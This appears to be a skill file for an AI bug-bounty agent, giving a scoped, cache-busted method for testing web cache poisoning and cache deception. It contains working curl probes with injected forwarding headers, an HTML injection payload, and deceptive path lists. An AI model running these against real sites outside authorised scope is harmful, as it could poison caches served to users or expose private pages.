---
name: zp-cache-poison
description: ZeroProtocol hunter for web cache poisoning and cache deception. Use when a CDN or cache sits in front of the app (x-cache, cf-cache-status, age, via), when testing unkeyed headers, when hunting cache-key normalisation issues, when checking whether a static-looking extension makes a private page cacheable, or when a reflected value could be stored for other users. Uses a unique cache buster on every probe so no real user is ever served your payload.
---

# zp-cache-poison - making the cache do it for you

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

**The safety rule that defines this skill:** every probe carries a unique cache buster
(`?zpcb=<random>`) so your payload is only ever stored under a key nobody else will request.
Poisoning the real, unkeyed home page serves your payload to every visitor - that is an attack
on the target's users, not a proof of concept.

Prove it on a busted key, then explain in the report that the same response would be stored on
the production key. Triagers accept this; it is the standard for responsible cache testing.

---

## Procedure

**1. Confirm there is a cache and learn how it reports itself.**

```bash
CB="zpcb=$RANDOM$RANDOM"          # fix the buster ONCE - both requests must share one cache key
for i in 1 2; do
  curl -skI "https://$H/?$CB" \
    | grep -iE 'x-cache|cf-cache-status|age|via|x-served-by|cache-control|vary|x-varnish|x-drupal-cache'
  echo ---
done
```

`$RANDOM` re-expands on every use, so a buster written inside the loop gives each request its own
key and the pair can never show MISS->HIT or a rising `Age`. You would read your own two misses as
"no caching on that path" and kill a live target.

| Header | Reading |
|---|---|
| `X-Cache: MISS` then `HIT` on the same URL | a cache is storing responses. Proceed |
| `CF-Cache-Status: HIT/MISS/DYNAMIC/BYPASS` | Cloudflare; `DYNAMIC` means not cached |
| `Age: <n>` increasing | a stored response, `n` seconds old |
| `Vary: Accept-Encoding` only | very few headers are keyed - good for you |
| `Cache-Control: private, no-store` | not cached. Usually killed - but test deception anyway |

**2. Find unkeyed inputs that change the response.** The classic technique: add a header, see it
reflected, then see whether it survives into the cached copy.

One fresh buster **and** one distinct marker per header. Reuse either and the sweep lies to you:
if the path is cacheable at all - the precondition for this whole skill - the first probe stores a
response under the shared key, every later probe is served from that stored copy, and one shared
marker makes the mix-up invisible. Whichever header reflected first then makes all of them look
positive, or a stored clean copy makes all of them look negative.

```bash
for hdr in "X-Forwarded-Host: ZPM.evil.tld" \
           "X-Host: ZPM.evil.tld" \
           "X-Forwarded-Server: ZPM.evil.tld" \
           "X-Original-URL: /ZPM" \
           "X-Rewrite-URL: /ZPM"; do
  CB="zpcb=$RANDOM$RANDOM"; M="zp$RANDOM$RANDOM"      # new key and new marker each iteration
  printf '%-24s ' "${hdr%%:*}"
  curl -sk "https://$H/?$CB" -H "${hdr//ZPM/$M}" | grep -c "$M"
done
```

A non-zero count means the header is **reflected**. The scheme, proto and port headers carry no
marker of their own, so a marker grep can never see them - score each on its own signal, against a
baseline fetched on its own key:

```bash
for hdr in "X-Forwarded-Proto: http" "X-Forwarded-Scheme: http" "X-Forwarded-Port: 1337"; do
  printf '%-24s ' "${hdr%%:*}"
  CB="zpcb=$RANDOM$RANDOM"; base=$(curl -sk "https://$H/?$CB" | grep -coE "http://$H|:1337")
  CB="zpcb=$RANDOM$RANDOM"; with=$(curl -sk "https://$H/?$CB" -H "$hdr" | grep -coE "http://$H|:1337")
  echo "baseline $base  with-header $with"
done
```

`with` above `base` means the header rewrote the links the page generates - the protocol-downgrade
pattern below. `X-HTTP-Method-Override: POST` does **not** belong in a reflection sweep: it reflects
nothing, and it turns your GET probe into a POST at the origin, which can fire a state-changing
action on the target. Test method override on purpose, on a route you have established is safe, and
never as one row of a loop.

Reflected is half of it. The question is whether the header is **keyed**:

```bash
CB="zpcb=$RANDOM$RANDOM"; M="zp$RANDOM$RANDOM"
curl -sk "https://$H/?$CB" -H "X-Forwarded-Host: $M.evil.tld" -o /dev/null   # poison the busted key
curl -sk -D /tmp/zp.hdr -o /tmp/zp.body "https://$H/?$CB"                    # fetch WITHOUT the header
grep -iE 'x-cache|cf-cache-status|^age' /tmp/zp.hdr                          # must say HIT, or Age > 0
grep -c "$M" /tmp/zp.body
```

Both lines have to answer: the marker present **and** the header block showing the response came
from cache. A marker with no cache hit means the origin echoed it again, not that the cache stored
it. Reflected, unkeyed and served from cache is the finding. Reflected but keyed is harmless.

**3. What the reflection is worth.**

| Where it lands | Impact |
|---|---|
| `<script src="//INJECTED/app.js">` | stored XSS on every cache consumer. Critical |
| `<link href>`, `<img src>` to your host | resource hijack, and a CSP-dependent XSS path |
| `Location:` redirect | stored open redirect for all users |
| an absolute URL in JSON consumed by the SPA | client-side redirect or script load |
| password-reset link built from `X-Forwarded-Host` | ATO -> also `zp-jwt-oauth` |
| a plain text reflection with no sink | low; keep looking for a sink |

**4. Cache-key normalisation - poison without any header at all.**

```
/index.html?zpcb=1&utm_source=x'"><img src=x>     parameter excluded from the key but reflected
/index.html%23?zpcb=1                              fragment handling differences
//index.html?zpcb=1                                double slash normalised differently by cache and origin
/index.html/..%2f?zpcb=1                           path traversal normalised post-key
/INDEX.HTML?zpcb=1                                 case sensitivity mismatch
/index.html;x=1?zpcb=1                             path parameter stripped by one side only
```

Also test **unkeyed query parameters**: if the cache excludes `utm_*` from the key but the origin
reflects it, you have poisoning with no headers involved.

**5. Cache deception - the mirror image.** Here you make a *private* page look static so the
cache stores it, then read another user's stored copy.

```bash
for v in "/account.css" "/account.js" "/account.json" "/account;.css" "/account%23.css" \
         "/account%3F.css" "/account/.css" "/account.css/" "/account/x.css" "/account?x=.css"; do
  printf '%-22s ' "$v"
  curl -sk -D /tmp/zp.hdr -o /tmp/zp.body "https://$H$v" -H "Cookie: session=$TOK_A"
  grep -iE 'x-cache|cf-cache-status|content-type|^age' /tmp/zp.hdr | tr '\n' ' '
  echo "body $(wc -c < /tmp/zp.body) bytes"
done
```

Use a **GET**, never `curl -I`. HEAD is a different cache operation: several CDNs and reverse
proxies do not store HEAD responses at all, and others answer HEAD out of an internal GET without
populating or reporting the stored entry - so HEAD hides the very `HIT`/`Age` you came for, and
gives false negatives on exactly the `/account`, `/settings`, `/api/me` paths that matter. The body
is not optional either: it is where you confirm the cached copy is your own account page.

If `/account.css` returns **your account page** with a `Content-Type: text/html` **and** a cache
`HIT`/`Age`, the cache has stored authenticated content under a URL an attacker can request.

**Confirm it safely:** fetch the same deceptive URL with **no cookies at all**. If your own
account data comes back, the cache is serving private content to the unauthenticated world -
that is the finding. You have proven it using only *your own* data, which is exactly right.
Never fish for another user's cached page.

**6. Check `Vary`.** `Vary: X-Forwarded-Host` means the header is keyed and the attack dies. A
thin `Vary` is what makes this class work.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| unkeyed header reflected into a cached response on a busted key | **confirmed poisoning.** Severity by sink |
| reflection reaches a `<script src>` | Critical - stored XSS for every consumer |
| deceptive URL returns your own private page, cached, with no cookie | **confirmed cache deception.** High |
| reflected but the header is in `Vary` | keyed. Killed |
| reflected but `Cache-Control: private/no-store` and never a HIT | not cached. Killed |
| `X-Cache: MISS` on every request | no caching on that path. Killed |
| the reflection appears only with your header present | keyed, or not cached. Killed |
| `Age` never increases | not stored |
| poisoning works only on a URL you invented (`?zpcb=…`) | **that is the correct, safe proof.** Explain the production key in the report |
| you can only show impact by poisoning the real home page | **do not do it.** Describe the mechanism instead |

---

## High-value patterns

- **`X-Forwarded-Host` reflected into an absolute script URL** - the canonical high-impact case.
- **`X-Forwarded-Proto: http` causing a protocol downgrade** in generated links.
- **Reset-password emails built from a forwarded host header** - ATO, and it does not even need the cache.
- **Unkeyed `utm_*` or tracking parameters** reflected into HTML - poisoning with no exotic headers.
- **Cache deception on `/account`, `/settings`, `/api/me`** - PII to anonymous users.
- **A poisoned response plus a smuggled request** -> chain with `zp-smuggling`; that combination is a very strong report.
- **CDN caching an API response containing a token** - check `Authorization`-bearing endpoints for cache headers.

---

## Pitfalls

- **Poisoning a real, shared cache key.** The central rule here. Always use a cache buster.
- **Fishing for other users' cached pages.** Prove deception with your own account's data.
- **Reporting a reflection without proving it is unkeyed.** The second fetch, without the header, is the whole test.
- **Ignoring `Vary`.**
- **Testing during peak traffic** - a busted key is safe, but repeated misses add origin load. Keep the volume low.
- **Assuming one CDN node's behaviour is global.** Caches are per-PoP; note which node (`x-served-by`, `cf-ray`) you saw it on.
- **Leaving a poisoned busted key behind.** It expires, but say in the report what you stored and where.
- **Confusing deception and poisoning** in the write-up - they have different root causes and different fixes.

---

## Hand off to

Confirmed -> `zp-triage`, `zp-report` (state clearly that you proved it on an isolated key).
Script-src reflection -> `zp-xss` for the execution chain. Reset-link host injection ->
`zp-jwt-oauth`. Desync available -> `zp-smuggling` to chain. Cached API responses with tokens ->
`zp-api`, `zp-authz`.
